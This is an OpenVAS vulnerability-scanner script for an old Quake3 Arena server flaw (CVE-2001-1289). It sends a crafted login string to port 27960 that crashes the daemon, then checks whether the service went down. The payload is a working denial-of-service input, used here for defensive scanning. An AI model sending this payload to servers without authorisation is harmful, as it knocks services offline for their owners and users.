# OpenVAS Vulnerability Test
# $Id: quake3_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Quake3 Arena 1.29 f/g DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>,
# starting from miscflood.nasl
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CVE
#
# Copyright:
# Copyright (C) 2001 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to crash the Quake3 Arena daemon by sending a specially
crafted login string.

A cracker may use this attack to make this service crash continuously, 
preventing you from playing.";

tag_solution = "upgrade your software";

if(description)
{
 script_id(10931);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3123);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2001-1289");
 name = "Quake3 Arena 1.29 f/g DOS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;



 script_description(desc);
 
 summary = "Quake3 Arena DOS";
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright("This script is Copyright (C) 2001 Michel Arboi");
 family = "Denial of Service";

 script_family(family);
 script_require_ports(27960);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

function test_q3_port(port)
{
 if (! get_port_state(port))
  return(0);

 soc = open_sock_tcp(port);
 if (!soc)
  return(0);
 s = string(raw_string(0xFF, 0xFF, 0xFF, 0xFF), "connectxx");
 send(socket:soc, data:s);
 close(soc);

 soc = open_sock_tcp(port);
 if (! soc)
 {
  security_warning(port);
 }

 if (soc)
  close(soc);
 return(1);
}

test_q3_port(port:27960);

